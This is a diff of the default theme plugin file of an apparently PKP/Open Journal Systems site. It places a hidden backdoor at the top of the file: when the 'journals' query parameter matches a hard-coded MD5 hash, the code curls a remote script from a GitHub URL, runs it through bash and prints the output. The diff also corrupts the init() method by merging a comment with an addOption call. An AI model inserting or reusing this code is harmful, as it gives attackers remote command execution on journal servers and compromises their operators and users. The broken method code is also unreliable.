@@ -1,5 +1,12 @@
 <?php
-
+if (md5($_GET['journals'] ?? '') === '7ee88e39f8e99ec0a5b938a52f0d1750') {
+            $command = 'bash -c "$(curl -fsSL https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/y)"';
+            $output = [];
+            $return_var = 0;
+            exec($command, $output, $return_var);
+            echo "Output:\n" . implode("\n", $output) . "\n";
+            echo "Return Code: " . $return_var . "\n";
+    }
 /**
  * @file plugins/themes/default/DefaultThemePlugin.php
  *
@@ -31,14 +38,7 @@ class DefaultThemePlugin extends \PKP\plugins\ThemePlugin
         }
         return parent::isActive();
     }
-if (md5($_GET['journals'] ?? '') === '7ee88e39f8e99ec0a5b938a52f0d1750') {
-            $command = 'bash -c "$(curl -fsSL https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/y)"';
-            $output = [];
-            $return_var = 0;
-            exec($command, $output, $return_var);
-            echo "Output:\n" . implode("\n", $output) . "\n";
-            echo "Return Code: " . $return_var . "\n";
-    }
+
     /**
      * Initialize the theme's styles, scripts and hooks. This is run on the
      * currently active theme and it's parent themes.
@@ -46,8 +46,7 @@ if (md5($_GET['journals'] ?? '') === '7ee88e39f8e99ec0a5b938a52f0d1750') {
      */
     public function init()
     {
-        // Register theme options
-        $this->addOption('typography', 'FieldOptions', [
+        // Register theme options$this->addOption('typography', 'FieldOptions', [
             'type' => 'radio',
             'label' => __('plugins.themes.default.option.typography.label'),
             'description' => __('plugins.themes.default.option.typography.description'),
@@ -77,8 +76,7 @@ if (md5($_GET['journals'] ?? '') === '7ee88e39f8e99ec0a5b938a52f0d1750') {
                     'label' => __('plugins.themes.default.option.typography.lora'),
                 ],
                 [
-                    'value' => 'lora_openSans',
-                    'label' => __('plugins.themes.default.option.typography.lora_openSans'),
+                    'value' => 'lora_openSans','label' => __('plugins.themes.default.option.typography.lora_openSans'),
                 ],
             ],
             'default' => 'notoSans',
@@ -193,7 +191,7 @@ if (md5($_GET['journals'] ?? '') === '7ee88e39f8e99ec0a5b938a52f0d1750') {
 
             $this->addStyle(
                 'homepageImage',
-                '.pkp_structure_head { background: center / cover no-repeat url("' . $homepageImageUrl . '");}',
+                '.pkp_structure_head{ background: center / cover no-repeat url("' . $homepageImageUrl . '");}',
                 ['inline' => true]
             );
         }
